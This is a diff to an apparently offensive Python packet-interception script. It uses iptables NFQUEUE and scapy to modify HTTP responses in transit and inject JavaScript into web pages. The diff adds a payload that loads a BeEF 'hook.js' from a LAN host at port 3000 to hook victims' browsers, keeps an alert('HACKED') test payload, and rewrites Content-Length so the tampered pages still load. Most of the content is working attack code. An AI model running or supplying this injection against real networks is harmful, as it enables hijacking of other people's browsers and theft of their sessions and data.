@@ -8,7 +8,7 @@ Queue = None
 QueueNumb = 0
 
 def init_iptables():
-    # Chose 1 for testing with different machine, and 2 for testing locally
+    # Choose 1 for testing with a different machine, and 2 for testing locally
     # 1
     #subprocess.call(['iptables', '-I', 'FORWARD', '-j', 'NFQUEUE', '--queue-num',str(QueueNumb)])
 
@@ -45,7 +45,9 @@ def process_pkt(pkt):
         elif scapy_pkt[scapy.TCP].sport == 80: # HTTP Response
             print('[+] HTTP Response!')
             # Inject basic JS code
-            injection_code = b'<script>alert("HACKED");</script>'
+            injection_code_test = b'<script>alert("HACKED");</script>'
+            # Below is to use beef framework to hook, but I was not able to succed in other machines
+            injection_code = b'<script src="http://192.168.2.125:3000/hook.js"></script>'
             loadvar = loadvar.replace(b'</body>',injection_code + b'</body>')
 
             # Arrange proper length to make attack stronger
@@ -54,7 +56,7 @@ def process_pkt(pkt):
                 content_length = content_length_search.group(1)
                 new_content_length = int(content_length) + len(injection_code)
                 loadvar = load.replace( content_length, str(new_content_length).encode())
-                
+
             changed = True
 
         if changed == True:
